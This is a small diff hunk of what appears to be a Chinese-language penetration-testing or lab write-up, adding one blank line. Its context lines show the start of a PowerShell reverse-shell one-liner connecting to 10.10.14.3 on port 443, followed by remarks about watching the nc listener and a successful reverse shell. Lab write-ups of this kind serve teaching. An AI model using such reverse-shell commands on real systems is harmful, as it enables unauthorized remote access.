@@ -156,6 +156,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $c
 看 nc 这边的反应
 
 ![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600849164777.png)
+
 反弹成功！
 
 查看一下文件
